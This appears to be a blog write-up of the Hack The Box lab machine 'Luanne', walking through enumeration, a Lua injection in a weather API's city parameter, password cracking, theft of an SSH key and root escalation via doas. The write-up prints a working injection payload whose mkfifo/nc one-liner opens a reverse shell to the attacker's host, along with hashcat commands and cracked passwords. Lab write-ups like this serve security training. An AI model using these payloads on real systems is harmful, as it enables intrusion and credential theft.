---
title: Luanne Hackthebox Writeup
date: 2021-03-27 09:00:00 +0530
categories: [Hackthebox, Active]
tags: [bsd,doas,hashcat,cracking,hashes,ssh,reverse shell,lua,gobuster,directory enumeration,netbsd,luanne,hackthebox,easy]     # TAG names should always be lowercase
image: /assets/img/luanne-hackthebox/luanne-pic.png
subtitle: JHBDOcubeoveiubo
---

# Introduction@Luanne:~$


Column | Details
------------ | -------------
Name | Luanne
IP | 10.10.10.218
Points | 20
Os | BSD
Difficult | Easy
Creator | [polarbearer](https://www.hackthebox.eu/home/users/profile/159204)
Out on | 28th November 2020

# Summary:~$

* Discovering the new host and scanning for open ports.
* Checking **robots.txt** and enumerating the `directories`.
* Generating a reverse shell in `Lua`.
* Getting a low priviveleged shell, and traversing in every directory.
* **Cracking** hash using `hashcat`.
* Accessing an unexplored port i.e. `3001`.
* Extracting `id_rsa` of one of the users : `r.michaels` using a crafted **curl** command.
* Loging into `r.michaels` using **ssh** with **id_rsa**.
* Manually `enumerating` and looking for interesting files.
* Decrypting a file using `netpgp` : A tool for decrypting files in BSD.
* **Cracking** another hash using `hashcat`.
* **Escalating** privileges as **root** using `doas` command in BSD.

# Starting:~$

## Nmap

I have used **nmapAutomator** , which keeps the scanning fast and reduces effort.*(Not recommended in real life scenarios).* 

Dowload link: [nmapAutomator](https://github.com/21y4d/nmapAutomator)

___
![](/assets/img/luanne-hackthebox/xx-alternate-nmapautomator.png)


Basically 3 ports are open : `22:ssh` `80:http` `9001:http-Medusa`.

I looked at **port 80** which showed `/weather` as one of the directories.

Accessing `http://10.10.10.218`.

___
![](/assets/img/luanne-hackthebox/latestt-01.png)


Accessing `http://10.10.10.218/robots.txt`.

___
![](/assets/img/luanne-hackthebox/latest-02.png)


Accessing `http://10.10.10.218/weather`.

___
![](/assets/img/luanne-hackthebox/latest-03.png)


It shows a `404 error` , enumerating directory with `gobuster`.

**Command used:** `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/ -t 100`

___
![](/assets/img/luanne-hackthebox/gobuster.png)


I got another directory as `/forecast`. Further accessing and providing the parameter as `city`.

___
![](/assets/img/luanne-hackthebox/latest-04.png)


___
![](/assets/img/luanne-hackthebox/latest-05.png)


Trying to create an `error` with which is `%27` in URL encode.

___
![](/assets/img/luanne-hackthebox/creating-error.png)


From the error I got to know that a language called `Lua` is being used.

After some research I created a `reverse shell`.

**Shell Command :** *http://10.10.10.218/weather/forecast?city=London'+os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP 4444 >/tmp/f ")+'*

URL encoding the reverse shell payload, sending it and listening on `nc`.

___
![](/assets/img/luanne-hackthebox/initial-foothold-shell-10.png)


I got a shell as `_httpd`.

After that, I manually enumerated the files and while accessing `/var/www/`, I got a `.htpasswd` file.

___
![](/assets/img/luanne-hackthebox/webapi-user-12.png)


I used `Hashcat` to crack the hash.

**Hashcat Command:** *hashcat -m 500 -a 0 /home/pulkittalwar2611/Desktop/hashes rockyou.txt --force*. Where the hash is stored in the file called `hashes`.

___
![](/assets/img/luanne-hackthebox/hashcat-commad-cracking-14.png) ___

Got the password as `iamthebest`. I logged in port 80 but couldn't find anything there.

Accessing `port 9001`, and entering **user:123** as random username:password.

___
![](/assets/img/luanne-hackthebox/port-9001-login-access-17.png)


Further I checked `http://10.10.10.218:9001/logtail/processes`. I found the following:

___
![](/assets/img/luanne-hackthebox/logical-process-3001-port.png)


To understand in detail, read this : [Userdir](https://httpd.apache.org/docs/2.4/mod/mod_userdir.html) and [Userdir-feature](https://websiteforstudents.com/configure-nginx-userdir-feature-on-ubuntu-16-04-lts-servers/).

Getting `id_rsa` of the user: `r.michaels`.

**Command Used:** *curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa*

___
![](/assets/img/luanne-hackthebox/id-rsa-r.michaels-19.png)


Proving permissions to `id_rsa` as `600`. Loging in as `r.michaels` using ssh and id_rsa.

**Command Used:** *chmod 600 id_rsa* 

*ssh -i id_rsa r.michaels@10.10.10.218*

___
![](/assets/img/luanne-hackthebox/ssh-loggedin-21.png)


Got `User Flag`.

___
![](/assets/img/luanne-hackthebox/user-flag-22.png)


Further enumerating manually, I got a `backup file` in `/home/r.michaels/backups/`. As it was encrypted so I used `netpgp` command to decrypt it.

___
![](/assets/img/luanne-hackthebox/backups-r.michales-encrypt-23.png)


**Command Used:** *netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc --output=/tmp/output.tar.gz*

___
![](/assets/img/luanne-hackthebox/netpgp-decrypt-output-25.png)


___
![](/assets/img/luanne-hackthebox/unzip-gunzip-28.png)


After accessing `devel-2020-09-16/www/.htpasswd`, I got another hash: *webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.*

Again used `Hashcat` to crack the hash.

**Hashcat Command:** *hashcat -m 500 -a 0 /home/pulkittalwar2611/Desktop/hashes rockyou.txt --force*. Where the hash is stored in the file called `hashes`.

___
![](/assets/img/luanne-hackthebox/hash-crack-root-30.png)


Got the password as `littlebear`.

To upgrage `privileges` in BSD, following command is used : *doas -u root /bin/sh* and then enter the password you got.

___
![](/assets/img/luanne-hackthebox/root-31.png)


Got `Root Flag`.
